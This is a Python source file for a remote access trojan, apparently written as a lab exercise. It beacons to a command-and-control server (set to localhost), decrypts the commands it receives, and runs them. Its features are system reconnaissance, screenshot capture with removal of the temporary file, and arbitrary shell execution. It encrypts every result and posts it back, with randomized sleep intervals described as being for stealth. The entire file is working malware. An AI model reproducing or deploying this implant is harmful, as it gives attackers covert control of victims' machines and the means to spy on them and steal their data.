import requests, subprocess, time, platform, getpass, random, os, io
from cryptography.fernet import Fernet
import mss 

MASTER_KEY = b'ZOVYlkVemlNv6eHwPGbOtM1p_LZwMEmHIg-e0bGh_xo=' 
cipher = Fernet(MASTER_KEY)
URL = "http://127.0.0.1:5000"

def get_sysinfo():
    try:
        info = {
            "node": platform.node(),
            "os": f"{platform.system()} {platform.release()}",
            "user": getpass.getuser(),
            "arch": platform.machine()
        }
        return str(info).encode()
    except Exception as e:
        return f"Recon Error: {str(e)}".encode()

def take_screenshot():
    """Mission 2: Capture screen and return as encrypted bytes"""
    try:
        with mss.mss() as sct:
            # Capture monitor 1
            filename = sct.shot(mon=1, output='temp.png')
            with open(filename, "rb") as f:
                img_data = f.read()
            os.remove(filename) # Clean up traces immediately
            return img_data
    except Exception as e:
        return f"Screenshot Error: {str(e)}".encode()

# --- MAIN AGENT LOOP ---
while True:
    try:
        # Check-in (Beacon)
        r = requests.get(f"{URL}/get_command")
        if r.status_code != 200: continue
        
        cmd = cipher.decrypt(r.content).decode()
        
        # MISSION LOGIC
        if cmd == "sysinfo":
            result = get_sysinfo()
        elif cmd == "screengrab":
            result = take_screenshot()
        else:
            # Mission 3: Live Shell
            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)

        # Encrypt and Exfiltrate
        enc_result = cipher.encrypt(result)
        requests.post(f"{URL}/post_result", data={'result': enc_result})

    except Exception as e:
        # Error handling with randomized jitter for stealth
        enc_error = cipher.encrypt(f"Error: {str(e)}".encode())
        requests.post(f"{URL}/post_result", data={'result': enc_error})
        time.sleep(random.randint(10, 25))
    
    # Standard Jitter
    time.sleep(random.randint(5, 15))